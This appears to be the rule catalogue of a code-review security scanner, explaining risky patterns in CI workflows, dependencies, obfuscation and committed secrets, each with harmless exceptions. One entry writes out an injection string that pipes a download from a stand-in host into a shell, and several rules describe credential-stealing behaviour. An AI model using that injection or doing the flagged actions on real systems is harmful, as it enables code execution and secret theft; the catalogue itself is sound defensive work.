## CFG001

**TLS certificate verification disabled**

Without certificate checks, anyone on the network path can impersonate the server and read or change the traffic, including credentials sent over it.

_Could be harmless if:_ Talking to a local service with a self-signed certificate in development or tests.

## CFG002

**Cross-origin access allowed from any site**

A wildcard CORS policy lets any website's scripts call this API from a visitor's browser. Combined with cookies or credentials it exposes user data to other sites.

_Could be harmless if:_ Public, read-only APIs and CDNs serve '*' on purpose.

## CFG003

**Framework protection turned off**

Debug mode, disabled CSRF protection and insecure cookies remove defences the framework provides by default. Debug pages in particular can leak secrets or allow code execution.

_Could be harmless if:_ Local development settings, tests, and API endpoints that use token auth instead of cookies.

## CFG004

**World-writable file permissions**

Files anyone on the machine can modify (777, 666, o+w) let any local user or compromised service replace code or configuration that later runs with more privileges.

_Could be harmless if:_ Throw-away containers and scratch directories, though narrower permissions still work.

## CFG005

**Authentication or authorization check removed**

A line that enforced login, permissions, CSRF or signature checks was deleted and not added back elsewhere in the same file. Removing a check is easy to miss in review because the remaining code still looks complete.

_Could be harmless if:_ The check moved to middleware, a base class or another file, or the endpoint was retired.

## CI001

**Workflow runs on pull_request_target**

pull_request_target runs with the base repository's secrets and a write token, even for pull requests from forks. It is only safe if the job never builds, runs or trusts code from the pull request.

_Could be harmless if:_ Labelling, triage and welcome-comment workflows use it without touching PR code.

## CI002

**Workflow checks out pull request code**

Checking out the PR's head commit in a privileged workflow (pull_request_target or workflow_run) lets anyone who opens a PR run code with the repository's secrets: the 'pwn request' pattern.

_Could be harmless if:_ Harmless in a plain pull_request workflow, which has no secrets for fork PRs.

## CI003

**Untrusted input expanded inside a script**

${{ }} expressions are pasted into the script before it runs. A PR title, branch name, issue body or commit message such as  a"; curl evil.sh | sh; "  becomes shell code. Pass the value through env: and use "$VAR" instead.

_Could be harmless if:_ None that make it safe in run: or script:; moving the value to env: fixes it.

## CI004

**Workflow token gets write permissions**

Every step in the job, including third-party actions, can use the token. Write access lets a compromised step push code, publish packages or edit releases.

_Could be harmless if:_ Release, deploy and labelling jobs need specific write scopes. Grant them per job.

## CI005

**Third-party action not pinned to a commit**

Tags and branches can be moved to new code at any time; in 2025 the tj-actions/changed-files tags were repointed to code that dumped CI secrets. Pinning to a full commit SHA freezes what runs.

_Could be harmless if:_ Common practice for trusted publishers; Dependabot can keep SHA pins up to date.

## CI006

**Secrets exposed in workflow output**

Printing secrets, serialising the whole secrets context or re-enabling deprecated commands can put credentials into logs and artifacts, where GitHub's masking does not always catch encoded or partial values.

_Could be harmless if:_ Debugging steps sometimes echo values temporarily; they should not be merged.

## CI007

**Job runs on a self-hosted runner**

Self-hosted runners are not wiped between jobs. If pull requests can trigger the job, PR code can persist on the machine and reach whatever network it is on.

_Could be harmless if:_ Normal for private repositories and for jobs that never run on PRs from forks.

## DEP001

**New dependency**

Every new package is code from a new author that runs in the project, often with install scripts. Worth a quick check of who publishes it, how widely it is used and whether it is really needed.

_Could be harmless if:_ Most new dependencies are ordinary and well known.

## DEP002

**Package name one typo away from a popular package**

Attackers publish packages whose names differ from popular ones by a single character (crossenv for cross-env, reqeusts for requests) and wait for someone to mistype.

_Could be harmless if:_ Some legitimate packages have similar names; check the publisher and download counts.

## DEP003

**Dependency source outside the default registry**

Installing from a git URL, a tarball, a local path or an extra package index bypasses the registry's ownership and version history. An extra index also enables dependency confusion: a public package with an internal name wins the version race.

_Could be harmless if:_ Private registries, forks with an unreleased fix, and monorepo workspaces.

## DEP004

**Lockfile changed without its manifest**

Lockfiles are long, generated and rarely read, so they are a convenient place to swap a package version or download URL without any visible change to the declared dependencies.

_Could be harmless if:_ Automated updates (Dependabot, Renovate, npm audit fix) legitimately touch only the lockfile.

## DEP005

**Lockfile resolves a package from an unusual host**

The lockfile says to download a package from a host other than the public registry. Editing resolved URLs is a known way to slip a different tarball past review.

_Could be harmless if:_ A company mirror or private registry configured for the project.

## EXE001

**Downloaded script piped straight into a shell**

Whatever the server returns at that moment runs immediately with the current user's rights, with no review and no integrity check. If the host or the connection is compromised, so is every machine or CI runner that runs this line.

_Could be harmless if:_ Official installers (rustup, Homebrew, nvm) are distributed this way. Prefer a pinned version and a checksum, especially in CI.

## EXE002

**Dynamic code evaluation**

eval, exec and new Function run a string as code. If any part of that string can be influenced from outside, it becomes remote code execution; it is also a common way to hide what code really does.

_Could be harmless if:_ Templating engines, REPLs, plugin loaders and build tools use it deliberately.

## EXE003

**Shell command execution**

Running a command through a shell interprets quotes, semicolons and $(...) in its arguments. Any outside input in the command string allows command injection.

_Could be harmless if:_ Build scripts and developer tooling often run fixed commands. It is safe when the command is a constant or the arguments are passed as a list without a shell.

## EXE004

**Unsafe deserialization**

pickle, marshal, unsafe YAML loaders, Java ObjectInputStream and PHP unserialize can run code while decoding. Loading data from an untrusted source with them is remote code execution.

_Could be harmless if:_ Loading files the application wrote itself, such as a local cache or a trained model.

## EXE005

**Install-time script**

Package managers run install hooks automatically on every machine that installs the project, including CI. They are the most common way malicious packages run code.

_Could be harmless if:_ Native extensions compile on install, and tools like husky set up git hooks in prepare. Check what the script actually runs.

## EXE006

**Python startup file (.pth) with code**

Lines starting with 'import' in a .pth file in site-packages run every time Python starts, for every program. Malware uses this to persist.

_Could be harmless if:_ A few packages (coverage tools, editable installs) ship .pth hooks on purpose.

## NET001

**Hardcoded public IP address**

Connecting to a raw public IP skips DNS, certificates tied to a name and most allow-lists, and the address says nothing about who owns it. Malware uses this for command-and-control.

_Could be harmless if:_ Public DNS resolvers, well-known service IPs, or test infrastructure.

## NET002

**Data-drop, paste or tunnelling service**

Request catchers, paste sites, chat webhooks and tunnels accept data from anyone without an account. They are favourite destinations for stolen tokens and environment dumps.

_Could be harmless if:_ Developers use them while debugging webhooks, and bots post to Discord or Telegram on purpose. Check what data is sent.

## NET003

**New outbound network destination**

The change makes the code talk to a host it may not have talked to before. Reviewers should know where data goes, especially when something is sent rather than fetched.

_Could be harmless if:_ Most new URLs are ordinary APIs, documentation links or CDNs.

## NET004

**Collects every environment variable**

Environment variables hold API keys and CI tokens. Serialising all of them at once is rarely needed by application code and is the first step of most credential-stealing packages.

_Could be harmless if:_ Debug output and diagnostics tools sometimes dump the environment locally.

## NET005

**Reads files where credentials are stored**

SSH keys, cloud credential files, package-registry tokens, browser password stores and crypto wallets are what info-stealing code looks for.

_Could be harmless if:_ Deployment and developer tools legitimately read their own configuration files.

## OBF001

**Hidden bidirectional control character**

Invisible Unicode controls change the order in which text is displayed, so code can look different in review from how the compiler or interpreter reads it ('Trojan Source', CVE-2021-42574). A comment can appear to close early, or a string can appear to hold code that actually runs.

_Could be harmless if:_ Right-to-left text (Arabic, Hebrew, Persian) in strings, comments or translation files sometimes needs these characters. That is fine when they sit inside readable text and not around code tokens.

## OBF002

**Invisible character in code**

Zero-width and blank-looking characters (such as U+200B or the Hangul filler U+3164) can make two identifiers or strings that look identical actually differ, or hide an extra parameter in plain sight.

_Could be harmless if:_ Copy-pasted text from documents or chat apps often carries stray zero-width spaces.

## OBF003

**Look-alike letters from another alphabet**

A word that mixes Latin letters with Cyrillic or Greek ones (Cyrillic U+0430 in place of the 'a' in 'paypal') looks normal but is a different identifier, domain or string: a homoglyph attack.

_Could be harmless if:_ Mathematical code using Greek letter names, or genuine multilingual text.

## OBF004

**Long encoded or escaped blob**

Large base64, hex or escape-sequence strings in source code cannot be reviewed by reading. Malicious changes hide payloads this way and decode them at runtime.

_Could be harmless if:_ Embedded images, fonts, test vectors, certificates and generated data files.

## OBF005

**Decodes data and runs it as code**

Decoding a string and immediately executing it means the code that runs is not the code that was reviewed. Legitimate software almost never needs this.

_Could be harmless if:_ Very rare: some packers and self-extracting installers. It still deserves a close look.

## OBF006

**Very long line in hand-written source**

A line thousands of characters long in a normal source file usually means minified or generated code, which hides what it does from reviewers and from diff views.

_Could be harmless if:_ Generated files committed outside a build folder, or long data literals.

## OBF007

**Compiled binary or archive added**

Executables, libraries, bytecode and archives cannot be reviewed in a pull request. Whatever is inside will run or be unpacked as-is.

_Could be harmless if:_ Vendored tools, test fixtures or release assets; ideally they are built in CI instead.

## PATH001

**CI or automation configuration changed**

Pipelines hold deployment credentials and decide which checks run. A change here can affect every future build, and deleting a workflow silently stops a check.

_Could be harmless if:_ Routine maintenance: version bumps, new test matrix entries, caching tweaks.

## PATH002

**Code ownership or review rules changed**

CODEOWNERS and repository settings decide who must approve changes. Editing them in the same PR as other changes can remove the reviewer who would have objected.

_Could be harmless if:_ Team changes and new directories need ownership updates.

## PATH003

**Config that runs commands on developer machines**

Editor tasks, dev containers, git hooks, direnv files, test bootstrap files and git filters run automatically when someone opens, builds or tests the project, often without an obvious prompt.

_Could be harmless if:_ Teams share these deliberately to standardise their setup.

## PATH004

**Security-sensitive code changed**

The file name suggests authentication, authorization, sessions or cryptography. Bugs here have outsized impact, so the change deserves a reviewer who knows that area.

_Could be harmless if:_ Ordinary changes to these files are common; this only routes attention.

## SEC001

**Private key committed**

A private key in the repository lets anyone who can read it impersonate its owner: sign in to servers, decrypt traffic or sign releases. Deleting it later does not remove it from git history; the key has to be revoked.

_Could be harmless if:_ Documentation and tests sometimes contain revoked or fake keys. Even then, a real-looking key in history gets reported by scanners and copied by readers, so confirm it is not live.

## SEC002

**Access token with a known format**

The value matches the published format of a cloud or SaaS credential. Leaked tokens are harvested from public repositories within minutes and used to run up bills or steal data.

_Could be harmless if:_ Documentation and tests sometimes contain revoked or fake keys. Even then, a real-looking key in history gets reported by scanners and copied by readers, so confirm it is not live.

## SEC003

**Hardcoded password or secret**

A variable named like a credential is set to a literal, random-looking value. Secrets in source code end up in every clone, fork, log and backup of the repository.

_Could be harmless if:_ Local development defaults, test fixtures and example configuration often use dummy values. Check that this one is not used in a deployed environment.

## SEC004

**Password embedded in a URL**

A URL of the form scheme://user:password@host carries the password in plain text, and URLs are routinely written to logs, error messages and browser history.

_Could be harmless if:_ Connection strings for local databases in development or test setups are common.

## SEC005

**File that usually holds secrets**

Files such as .env, private key files, keystores and Terraform state usually contain credentials and are normally kept out of version control.

_Could be harmless if:_ Sample files with dummy values, public certificates (.pem can be either) and test keystores are sometimes committed on purpose.
